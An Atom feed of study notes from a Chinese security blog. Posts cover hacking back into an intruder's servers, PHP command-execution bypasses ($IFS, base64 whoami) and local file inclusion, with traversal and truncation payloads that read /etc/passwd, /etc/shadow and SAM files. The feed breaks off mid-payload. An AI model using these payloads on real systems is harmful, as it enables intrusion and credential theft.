<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>YYK&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://y-y-k.tk/"/>
  <updated>2020-03-22T03:19:34.045Z</updated>
  <id>http://y-y-k.tk/</id>
  
  <author>
    <name>YYK</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Micropoor前辈之渗透笔记（1）</title>
    <link href="http://y-y-k.tk/2020/03/22/Micropoor%E5%89%8D%E8%BE%88%E4%B9%8B%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89/"/>
    <id>http://y-y-k.tk/2020/03/22/Micropoor%E5%89%8D%E8%BE%88%E4%B9%8B%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89/</id>
    <published>2020-03-22T03:16:25.851Z</published>
    <updated>2020-03-22T03:19:34.045Z</updated>
    
    <content type="html"><![CDATA[<p><strong>此笔记的原书来源于<a href="https://github.com/Micropoor/Micro8.git" target="_blank" rel="noopener">Micropoor前辈的Micro8</a>，这里我仅对我感兴趣的地方做些自己的学习笔记，开头会注明来自哪几节课。</strong><br>以下来自第6节课<br>由于师傅写的已经很清楚了，这里只做思路和其他介绍</p><h1 id="反攻溯源情况介绍"><a href="#反攻溯源情况介绍" class="headerlink" title="反攻溯源情况介绍"></a>反攻溯源情况介绍</h1><p><strong>事件过程</strong>：某厂商日志分析发现IP，但是日志记录的其中行为直接大量登陆内网，并无攻击 过程，以及攻击手法，导致内网安全加固不知从何下手，并且不知道有什么后门需要清除， 而且日志里攻击者IP为外国IP，不确定真实IP，还是代理IP。无法定位真正攻击者的地理位 置。<br><strong>思路</strong>：反入侵得到攻击者机器权限，入侵现场还原，摸清入侵思路。并且须知入侵者的 相关后门遗留，以便处理后门。抓取入侵者的真实IP获得地理位置。并按照攻击者的攻击路 线加固相关漏洞安全。</p><h1 id="学习补强"><a href="#学习补强" class="headerlink" title="学习补强"></a>学习补强</h1><p><strong>1. <strong>tns日志</strong></strong><br>TNS协议是ORACLE服务端和客户端通讯的协议。TNS协议传输可以使用TCP/IP协议、使用SSL的TCP/IP协议、命名管道和IPC协议传输，其中TCP/IP协议传输是使用明文传送。<br><strong>2. 通过DHCP记录查看应用发现存在loadfile漏洞</strong><br>说实话，这里没有明白，希望懂的大佬能指点一下<br><strong>3. shift后门</strong><br>放一个写的比较有意思的<a href="https://blog.csdn.net/yakson/article/details/9698275" target="_blank" rel="noopener">链接</a></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ol><li>查看厂商日志和tns日志进行分析===》通过Oracle相关存储得到hacker的存储利用文件和源IP，此处得到两个IP和一个样本文件<br><img src="https://img-blog.csdnimg.cn/2020032209445029.png" alt="在这里插入图片描述">)<img src="https://img-blog.csdnimg.cn/20200322094533859.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200322094555699.png" alt="在这里插入图片描述"></li><li>刺探以上两个IP的服务器等信息，根据情况改变思路，例如尝试拿到服务器权限，查看日志，ip和对应时间，并记住尽量不留痕迹</li><li>通过DHCP记录查看应用发现存在文件包含漏洞和shift漏洞，16进制读取分析后连接。<br><img src="https://img-blog.csdnimg.cn/20200322094738597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>逆向分析得到的两个样本文件，侧重点为shift后门</li><li>连接shift后门后，弹出cmd命令和system权限<br><img src="https://img-blog.csdnimg.cn/20200322094831229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTY4Nzcw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li><li>找服务器日志进行关于攻击者ip，对应时间和其他文件的取证</li><li>根据以上样本分析及服务器的文件，进行厂商网站等加固</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;此笔记的原书来源于&lt;a href=&quot;https://github.com/Micropoor/Micro8.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Micropoor前辈的Micro8&lt;/a&gt;，这里我仅对我感兴趣的地方做些自己
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://y-y-k.tk/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="反攻溯源" scheme="http://y-y-k.tk/tags/%E5%8F%8D%E6%94%BB%E6%BA%AF%E6%BA%90/"/>
    
      <category term="渗透测试" scheme="http://y-y-k.tk/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>命令执行</title>
    <link href="http://y-y-k.tk/2020/03/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://y-y-k.tk/2020/03/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2020-03-15T03:02:40.339Z</published>
    <updated>2020-03-15T03:05:28.815Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>没有对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并由服务端进行执行。例如system()，eval()，exec()等函数。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><h2 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h2><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>is_callable()</p><h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array()"></a>call_user_func_array()</h2><p>后面注意是数组</p><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><p>匿名函数</p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>/e修正符</p><h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><h2 id="usort"><a href="#usort" class="headerlink" title="usort()"></a>usort()</h2><h2 id="uasort"><a href="#uasort" class="headerlink" title="uasort()"></a>uasort()</h2><h2 id="php代码-（eg-phpinfo-）"><a href="#php代码-（eg-phpinfo-）" class="headerlink" title="${php代码}（eg:phpinfo()）"></a>${php代码}（eg:phpinfo()）</h2><h2 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h2><p>系统命令</p><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h2><h2 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a>shell_exec()</h2><h2 id=""><a href="#" class="headerlink" title="``"></a>``</h2><p>与shell_esec功能相同</p><h2 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start()"></a>ob_start()</h2><p>打开输出控制缓冲</p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="分隔符"><a href="#分隔符" class="headerlink" title="分隔符"></a>分隔符</h2><ol><li><strong>%0a</strong>  换行符</li><li><strong>；</strong> 连续指令</li><li><strong>&amp;</strong>    后台进程</li><li><strong>|</strong>   管道符</li><li><strong>|| &amp;&amp;</strong>逻辑或，与<h2 id="空格代替符"><a href="#空格代替符" class="headerlink" title="空格代替符"></a>空格代替符</h2></li><li><strong>&lt;</strong></li><li><strong>$IFS</strong></li><li><strong>${IFS}</strong></li><li><strong>$IFS$9</strong></li><li><strong>%09</strong> 用于url传递<h2 id="执行绕过"><a href="#执行绕过" class="headerlink" title="执行绕过"></a>执行绕过</h2></li><li>a=l;b=s;$a$b</li><li><code>echo d2hvYW1p|base64 -D</code>  whoamii的base64编码</li><li>“substr string pos len”<br>从string中取出从pos位置开始长度为len的子字符串，如果pos或len为非正整数时，返回空字符串。<br>eg：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;$&#123;PATH:0:1&#125;&quot;</span><br><span class="line">ehco &quot;&#96;&amp;IFS\subster\$IFS\$(pwd)\$IFS\1\$IFS\1&#96;&quot;</span><br><span class="line">echo &#96;$(expr$&#123;IFS&#125;substr$&#123;IFS&#125;$PWD$&#123;IFS&#125;1$&#123;IFS&#125;1)&#96;</span><br><span class="line">expr$&#123;IFS&#125;substr$&#123;IFS&#125;$SESSION_MANAGER$&#123;IFS&#125;6$&#123;IFS&#125;1</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;原因&quot;&gt;&lt;a href=&quot;#原因&quot; class=&quot;headerlink&quot; title=&quot;原因&quot;&gt;&lt;/a&gt;原因&lt;/h1&gt;&lt;p&gt;没有对代码中可执行的特殊函数入口做过滤，导致用户可以提交恶意语句，并由服务端进行执行。例如system()，eval()，exec()等函数
      
    
    </summary>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/categories/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web漏洞总结" scheme="http://y-y-k.tk/tags/web%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
      <category term="命令执行" scheme="http://y-y-k.tk/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://y-y-k.tk/2020/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://y-y-k.tk/2020/03/15/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-03-15T03:02:28.331Z</published>
    <updated>2020-03-15T03:06:01.947Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h1><h2 id="本地文件包含（LFI）"><a href="#本地文件包含（LFI）" class="headerlink" title="本地文件包含（LFI）"></a>本地文件包含（LFI）</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行。类似于java里的继承，语言里的调用，并且对于传参过滤不严，例如以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $filename  &#x3D; $_GET[&#39;filename&#39;];</span><br><span class="line">    include($filename);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>其中，$_GET[‘filename’]没有严格过滤参数，导致可以构造恶意参数，达到攻击目的</p><h3 id="相关函数（php）"><a href="#相关函数（php）" class="headerlink" title="相关函数（php）"></a>相关函数（php）</h3><p>include()<br>include_once()<br>require()<br>require_once()<br><strong>区别：</strong><br>include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。<br>而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>可这样构造来获取文件，例如<a href="http://127.0.0.1/flag.php" target="_blank" rel="noopener">http://127.0.0.1/flag.php</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?file&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>常见敏感目录：<br>linux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure><p>windows</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br></pre></td></tr></table></figure><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>%00截断（php&lt;5.3.4）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?file&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br></pre></td></tr></table></figure><p>点号截断（windows,点号位数大于256，php&lt;5.2.8）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?file&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................</span><br></pre></td></tr></table></figure><p>路径长度溢出截断（windows，点号位数需要长于256；linux长于4096，php&lt;5.2.8）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php?file&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#